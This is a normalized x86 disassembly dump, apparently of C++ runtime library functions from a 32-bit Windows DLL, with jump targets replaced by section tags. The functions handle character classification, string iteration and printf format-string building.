push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_1002382a
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_10024630
pop ecx
inc eax
sub_1003ec2b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e85e
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ec70
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0xc ]
call sub_10023a78
test [ ebp + 0x8 ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
pop ebp
retn 0x8
sub_1003ecaf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
inc esi
inc esi
sub_1003ecde
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
inc esi
inc esi
sub_1003ed24
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10023a0b
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1003ed6b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1002399e
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1003ed9b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1002382a
add esp 0x14
test eax eax
mov eax 0xffff
jl r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_1003eddc
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x2c ]
pop ebp
retn 0xc
sub_1003edfa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ebx ecx
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10024832
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_1003ed9b
mov [ edi ] ax
inc esi
inc edi
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1003ee3d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
mov eax ecx
add eax 0x18
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_100234f0
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_1003ee90
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
sar edx 0x1
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
pop ebp
retn 0x10
sub_1003eeb3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
mov ebx ecx
cmp [ ebp + 0x18 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10024832
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_1003ee3d
inc esi
inc esi
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1003eefa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003ec4e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1003ef1b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_1003e930
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ef5e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003ef42
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1003ef7f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10048501
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003efa2
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004b1e7
add esp 0x14
pop ebp
retn 0x10
sub_1003efc3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003efe6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003f043
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003f09c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_100234f0
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_1003f0c6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea eax [ ecx + ecx ]
push eax
call sub_10024389
pop ecx
leave
retn
push 0x0
lea ecx [ ebp - 0xc ]
call sub_10001d48
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_10027dd1
int3
sub_1003f123
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
movzx eax ax
retn
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_1003f147
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003f188
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ ebp + 0x10 ]
mov [ ecx ] 0x2e
inc ecx
mov [ ecx ] 0x2a
inc ecx
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1003f1ef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x49
inc ecx
mov [ ecx ] 0x36
inc ecx
mov [ ecx ] 0x34
mov [ ecx ] bl
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
inc ecx
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1003f281
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10048501
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003f2a4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movzx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
inc ecx
pop ebp
retn 0x8
sub_1003f2c3
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_1003f2fd
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10024832
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp ebx eax
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_1003f351
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
jmp r-xdata
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp edx [ ebp + 0xc ]
setne al
movzx eax [ edx ]
movzx ecx [ esi ]
cmp cx ax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jb r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
inc edx
inc edx
inc esi
inc esi
sub_1003f394
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
sar eax 0x1
sar esi 0x1
cmp esi eax
ja r-xdata
mov eax esi
pop esi
pop ebp
retn
lea ecx [ esi + esi ]
push ecx
push [ ebp + 0x10 ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_100242f1
add esp 0x10
sub_1003f3c8
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003f351
add esp 0x14
pop ebp
retn 0x10
sub_1003f3e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003f40c
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] 0x2
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_1003f449
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
neg eax
sbb eax eax
inc eax
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
call sub_10024832
cmp eax [ edi ]
je r-xdata
sub_1003f47a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003f49d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x8
jb r-xdata
cmp [ ebp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_1003f4dc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
lea eax [ edi + edi ]
add [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x4 ]
push ebx
mov ebx [ eax + 0x14 ]
lea ecx [ ecx + ebx * 2 ]
lea edx [ edx + edi * 2 ]
pop ebx
cmp edx ecx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp edx eax
jae r-xdata
sub_1003f560
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_1003e930
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003f5a3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003f587
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1003f5c4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003f009
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1003f5e5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003f53f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1003f606
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
movzx eax ax
retn
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_1003f637
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
pop ebp
retn 0x4
sub_1003f677
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_1003f637
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003f6a2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_1003f677
dec [ ebp + 0x1c ]
inc esi
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_1003f6d9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_1003f677
dec [ ebp + 0x1c ]
jne r-xdata
sub_1003f704
push 0x14
mov eax sub_1004be50
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10024c18
mov ecx [ ebp + 0x8 ]
mov edi eax
xor ebx ebx
lea eax [ ebp - 0x20 ]
push eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10003779
push eax
push ebx
push [ edi + 0x8 ]
call sub_1000847e
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10003779
push eax
push ebx
push r--data
call sub_1003e7c1
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10003779
push eax
push ebx
push r--data
call sub_1003e7c1
mov ecx [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x14 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10003779
push eax
mov eax [ edi ]
movzx eax [ eax ]
push ebx
push eax
call sub_1003e793
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10003779
push eax
mov eax [ edi + 0x4 ]
movzx eax [ eax ]
push ebx
push eax
call sub_1003e793
add esp 0xc
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_100282db
retn 0x8
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10003779
push eax
push ebx
push r--data
call sub_1000847e
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10003779
push eax
push ebx
push 0x2e
call sub_1003e793
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ax
add esp 0xc
lea eax [ ebp - 0x18 ]
push eax
call sub_10003779
push eax
push ebx
push 0x2c
call sub_1003e793
add esp 0xc
mov [ esi + 0xe ] ax
sub_1003f83c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10024832
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi * 2 ]
pop edi
pop esi
pop ebp
retn 0x4
sub_1003f869
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov edx [ esi + 0x4 ]
push ebx
mov ebx [ eax + 0x14 ]
add ebx ecx
add edx edi
cmp edx ebx
pop ebx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp edx eax
jae r-xdata
sub_1003f8c7
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_10005274
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10007c55
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_10005239
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1003f903
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_10007c55
dec [ ebp + 0x18 ]
jne r-xdata
sub_1003f92e
push 0x10
mov eax sub_1004be6b
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10003779
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_10024c18
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_1000847e
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_100085d5
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_100085d5
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_100085d5
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_100087f2
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_100087f2
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_100282db
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_10026f10
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_10026f10
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10048527
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10048527
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1003fa94
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_1003e793
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_1003f677
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_1003fae1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1003fa94
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1003f6d9
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
